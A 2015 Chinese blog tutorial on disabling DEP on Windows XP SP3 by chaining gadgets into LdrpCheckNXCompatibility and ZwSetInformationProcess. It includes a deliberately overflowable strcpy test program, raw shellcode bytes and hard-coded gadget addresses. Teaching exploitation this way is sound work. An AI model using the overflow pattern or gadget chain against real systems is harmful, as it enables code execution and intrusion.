title: 绕过DEP之利用ZwSetInformationProcess
date: 2015-12-18 21:05:14
tags: 缓冲区溢出
---
数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。
本文讲述直接将进程的DEP 保护关闭，实施攻击。
<!-- more -->

# 实验环境
- 操作系统：Microsoft Windows XP SP3
- 分析工具：OllyDBG
- 编译器：VC++ 6.0

# ZwSetInformationProcess
一个进程的DEP 设置标识保存在KPROCESS 结构中的_KEXECUTE_OPTIONS 上，而这个标识可以通过API 函数ZwQueryInformationProcess 和ZwSetInformationProcess 进行查询和修改。

首先来看一下_KEXECUTE_OPTIONS 的结构。
```
_KEXECUTE_OPTIONS
Pos0ExecuteDisable :1bit
Pos1ExecuteEnable :1bit
Pos2DisableThunkEmulation :1bit
Pos3Permanent :1bit
Pos4ExecuteDispatchEnable :1bit
Pos5ImageDispatchEnable :1bit
Pos6Spare :2bit
```

这些标识位中前4 个bit 与DEP 相关
+ 当前进程DEP 开启时ExecuteDisable 位被置1
+ 当进程DEP 关闭时ExecuteEnable位被置1
+ DisableThunkEmulation 是为了兼容ATL 程序设置的
+ Permanent 被置1 表示这些标志都不能再被修改。

真正影响DEP 状态是前两位，所以我们只要将_KEXECUTE_OPTIONS的值设置为0x02（二进制为00000010）就可以将ExecuteEnable置为1。

接下来我们来看看关键函数NtSetInformationProcess：
```
ZwSetInformationProcess(
IN HANDLE ProcessHandle,
IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
IN PVOID ProcessInformation,
IN ULONG ProcessInformationLength );
```
- 第一个参数为进程的句柄，设置为−1 的时候表示为当前进程
- 第二个参数为信息类
- 第三个参数可以用来设置_KEXECUTE_OPTIONS
- 第四个参数为第三个参数的长度

Skape 和Skywing 在他们的论文Bypassing Windows Hardware-Enforced DEP 中给出了关闭DEP 的参数设置。
```
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
ZwSetInformationProcess(
NtCurrentProcess(), // (HANDLE)-1
ProcessExecuteFlags, // 0x22
&ExecuteFlags, // ptr to 0x2
sizeof(ExecuteFlags)); // 0x4
```
所以我们只要构造一个的合乎要求的栈帧，然后调用这个函数就可以为进程关闭DEP了。

还有一个小问题，函数的参数中包含着0x00 这样的截断字符，这会造成字符串复制的时候被截断。既然自己构造参数会出现问题，那么我们可不可以在系统中寻找已经构造好的参数呢？如果系统中存在一处关闭进程DEP 的调用，我们就可直接利用它构造参数来关闭进程的DEP 了。

# DEP关闭条件
在这微软的兼容性考虑又惹祸了，如果一个进程的Permanent 位没有设置，当它加载DLL时，系统就会对这个DLL 进行DEP 兼容性检查，当存在兼容性问题时进程的DEP 就会被关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合以下条件之一时进程的DEP 会被关闭：
1. 当DLL 受SafeDisc 版权保护系统保护时；
2. 当DLL 包含有.aspcak、.pcle、.sforce 等字节时；
3. Windows Vista 下面当DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识出不需要启动DEP 的模块时。

如果我们能够模拟其中一种情况，结果会是怎么样的呢？答案是进程的DEP 被关闭！
这里选择第一个条件进行尝试。我们来看一下Windows XP SP3 下LdrpCheckNXCompatibility 关闭DEP 的具体流程，以SafeDisc 为例。如图：

![](https://ww3.sinaimg.cn/large/005CA6ZCjw1ez5zr0kgu0j30s40e2q5p.jpg)

现在我们知道LdrpCheckNXCompatibility 关闭DEP 的流程了，我们开始尝试模拟这个过程，我们将从0x7C93CD24 入手关闭DEP，这个地址可以通过OllyFindAddr 插件中的Disable DEP→Disable DEP <=XP SP3 来搜索，如图12.3.3 所示。

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1ez61fdorvkj30hk01374u.jpg)

<font color="red">由于只有 CMP AL，1 成立的情况下程序才能继续执行，所以我们需要一个指令将AL 修改为1。</font>

将AL 修改为1 后我们让程序转到0x7C93CD24 执行，在执行0x7C93CD6F 处的RETN4 时DEP 已经关闭，此时如果我们可以在让程序在RETN 到一个我们精心构造的指令地址上，就有可能转入shellcode 中执行了。我们通过以下代码来分析此流程的具体过程。
```
#include<stdlib.h>
#include<string.h>
#include<stdio.h>
#include<windows.h>

char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D"//修正EBP
"\x19\x4A\x97\x7C"//增大ESP
"\xB4\xC1\xC5\x7D"//jmp esp
"\x24\xCD\x93\x7C"//关闭DEP 代码的起始位置
"\xE9\x33\xFF\xFF"//回跳指令
"\xFF\x90\x90\x90";

void test(){
	char tt[176];
	strcpy(tt,shellcode);
}

int main(){
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}
```
对实验思路和代码简要解释如下。 
1. 为了更直观地反映绕过DEP 的过程，我们在本次实验中不启用GS 和SafeSEH。
2. 函数test 存在一个典型的溢出，通过向str 复制超长字符串造成str 溢出，进而覆盖函数返回地址。
3. 将函数的返回地址覆盖为类似MOV AL,1 retn 的指令，在将AL置1 后转入0x7C93CD24关闭DEP。
4. DEP 关闭后shellcode 就可以正常执行了。

# 构造shellcode
通过前面的分析，我们需要先找到类似MOV AL,1 RETN 的指令，即可以将AL 置1，又可以通过retn 收回程序控制权。

OllyFindAddr 插件的Disable DEP→Disable DEP <=XP SP3 搜索结果的Step2 部分就是符合要求的指令。搜索结果如图：

![](https://ww4.sinaimg.cn/large/005CA6ZCjw1ez61j4s6a1j30gd033dhc.jpg)

为了避免执行strcpy 时shellcode 被截断，我们需要选择一个不包含0x00 的地址，本次实验中我们使用0x7C92E252 覆盖函数的返回地址。

关于覆盖掉函数返回地址所需字符串长度的计算我们不再讨论，在本次实验中我们需要184个字节可以覆盖掉函数返回地址，所以我们在181~184 字节处放上0x7C92E252，shellcode 内容如下所示。
```
charshellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"……"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
;
```
<font color="red">Tips:</font> 省略号前后的内容为弹出计算器二进制代码，上面的cpp文件中有写出，后面就不具体写出了

然后编译程序，用OllyDbg 加载调试程序。在0x7C92E257，即MOV EAX,1 后边的RETN指令处暂停程序。观察堆栈可以看到此时ESP 指向test 函数返回地址的下方，而这个ESP 指向的内存空间存放的值将是RETN 指令要跳到的地址，如图：

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1ez620ebxdyj30ho0azdk5.jpg)

所以我们需要在这个位置放上0x7C93CD24 （若此处不理解，可参考第一张图，LdrpCheckNXCompatibility 关闭DEP 的具体流程）以便让程序转入关闭DEP 流程，我们为shellcode 添加4 个字节，并放置0x7C93CD24，如下所示。
```
charshellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"……"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
"\x24\xCD\x93\x7C"//关闭DEP 代码的起始位置
;
```

重新编译程序后，用OllyDbg 重新加载程序，在0x7C93CD6F，即关闭DEP 后的RETN 4处下断点，然后让程序直接运行。但程序并没有像我们想象的那样在0x7C93CD6F 处中断，而是出现了异常。如图：

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1ez62bo0l8bj30hs0az78n.jpg)

程序现在需要对EBP-4 位置写入数据，但EBP 在溢出的时候被破坏了，目前EBP-4 的位置并不可以写入，所以程序出现了写入异常，所以我们现在的shellcode 布局是行不通的，在转入0x7C93CD24 前我们需要将EBP 指向一个可写的位置。

我们可以通过类似PUSH ESP POP EBP RETN 的指令将EBP 定位到一个可写的位置，依然请出我们的OllyFindAddr 插件，我们可以在Disable DEP <=XP SP3 搜索结果的Setp3 部分查看当前内存中所有符合条件的指令，如图:

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1ez62eexcwzj30gv05u0vp.jpg)

<font color="red">Tips:</font> 第三步中的指令，可能刚加载程序时，为空，在程序运行到一定阶段，可能才有结果

指令虽然找到了不少，但符合条件的不多。首先回顾一下图12.3.5 中各寄存器的状态，所有的寄存器中只有ESP 指向的位置可以写入，所以现在我们只能选择PUSH ESP POP EBP RETN 指令序列了。现在还有一个严重的问题需要解决，我们直接将ESP 的值赋给EBP 返回后，ESP 相对EBP 位于高址位置，当有入栈操作时EBP-4 处的值可能会被冲刷掉，进而影响传入ZwSetInformationProcess 的参数，造成DEP 关闭失败。

我们不妨先使用0x5D1D8B85 处的PUSH ESP POP EBP RETN 04 指令来修正EBP，然后再根据堆栈情况想办法消除EBP-4 被冲刷的影响。先对shellcode 重新布局，在转入关闭DEP流程前加入修正EBP 指令，代码如下所示。
```
charshellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"……"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正EBP
"\x24\xCD\x93\x7C" //关闭DEP 代码的起始位置
;
```

重新编译程序后用OllyDbg 加载，在0x7C95683B 处，即CALL ZwSetInformationProcess时下断点，待程序中断后观察堆栈情况。
如图所示，EBP-4 中的内容已经被冲刷掉，内容已经被修改为0x22，根据_KEXECUTE_OPTIONS 结构我们知道DEP 只和结构中的前4 位有关，只要前4 位为二进制代码为0100 就可关闭DEP，而0x22（00100010）刚刚符合这个要求，所以用0x22 冲刷掉EBP-4 处的值还是可以关闭DEP 的。

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1ez62o2leynj30hq0ax78f.jpg)

虽然现在我们已经关闭了DEP，但是我们失去了进程的控制权。


一般来说当ESP 值小于EBP 时，防止入栈时破坏当前栈内内容的调整方法不外乎减小ESP和增大EBP，由于本次实验中我们的shellcode 位于内存低址，所以减小ESP 可能会破坏shellcode，而增大EBP 的指令在本次实验中竟然找不到。一个变通的方法是增大ESP 到一个安全的位置，让EBP 和ESP 之间的空间足够大，这样关闭DEP 过程中的压栈操作就不会冲刷到EBP 的范围内了。

我们可以使用带有偏移量的RETN 指令来达到增大ESP 的目的，如RETN 0x28 等指令可以执行RETN指令后再将ESP 增加0x28 个字节。我们可以通过OllyFindAddr 插件中的Overflowreturn address-> POP RETN+N 选项来查找相关指令，查找部分结果如图12.3.10 所示。

 ![](https://ww3.sinaimg.cn/large/005CA6ZCgw1ez63xe0c2jj30ff03etb6.jpg)

 在搜索结果中选取指令时只有一个条件：不能对ESP 和EBP 有直接操作。否则我们会失去对程序的控制权。在这我们选择0x7C974A19 处的RETN 0x28 指令来增大ESP。我们对shellcode 重新布局，在关闭DEP 前加入增大ESP 指令地址。需要注意的是修正EBP 指令返回时带有的偏移量会影响后续指令，所以我们在布置shellcode 的时要加入相应的填充。
```
charshellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"……"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正EBP
"\x19\x4A\x97\x7C" //增大ESP
"\x90\x90\x90\x90" //jmp esp
"\x24\xCD\x93\x7C" //关闭DEP 代码的起始位置
;
```

我们依然在0x7C93CD6F 处中断程序，注意千万不要在程序刚加载完就在0x7C93CD6F 下断点， 不然您会被中断到崩溃。我们建议您先在0x7C95683B 处， 即CALL ZwSetInformationProcess 时下断点，然后F7，进入函数，单步运行到0x7C93CD6F，堆栈情况如图12.3.11 所示。

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1ez642y1cszj30ho0b1n1c.jpg)

可以看到，增大ESP 之后我们的关键数据都没有被破坏。执行完RETN 0x04 后ESP 将指向0x0012FEC4，所以我们只要在0x0012FE78 放置一条JMP ESP 指令就可让程序转入堆栈执行指令了。大家可以通过OllyFindAddr 插件中的Overflow return address→Find CALL/JMP ESP来搜索符合要求的指令，部分搜索结果如图12.3.12 所示。

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1ez646fsd8tj30ex02djt4.jpg)

本次实验我们选择0x7DC5C1B4 处的JMP ESP，然后我在0x0012FEC4 处放置一个长跳指令，让程序跳转到shellcode 的起始位置来执行shellcode，根据图12.3.11 中的内存状态，可以计算出0x0012FEC4 距离shellcode 起始位置有200 个字节，所以跳转指令需要回调205 个字节（200+5 字节跳转指令长度）。分析结束，我们开始布置shellcode，shellcode 布局如图12.3.13所示。

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1ez64a6x9j5j30jb038t93.jpg)

代码如下所示
```
charshellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"……"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正EBP
"\x19\x4A\x97\x7C" //增大ESP
"\xB4\xC1\xC5\x7D" //jmp esp
"\x24\xCD\x93\x7C" //关闭DEP 代码的起始位置
"\xE9\x33\xFF\xFF" //回跳指令
"\xFF\x90\x90\x90"
```

按照图 12.3.13 中布局布置好shellcode 后将程序重新编译，用OllyDbg 加载程序，我们建议您在0x7C93CD6F 处下断点，待程序中断后，我们按F8 键单步运行程序，并注意各指令对堆栈及程序流程的影响，理解这种shellcode 的布置思路。执行完JMP ESP 后就可以看到程序转入shellcode，如图12.3.14 所示。

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1ez648ldau6j30hq0b3djk.jpg)

继续运行程序就可以看到熟悉的对话框，如图12.3.15 所示。

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1ez615rdb3aj30ig0c1aao.jpg)

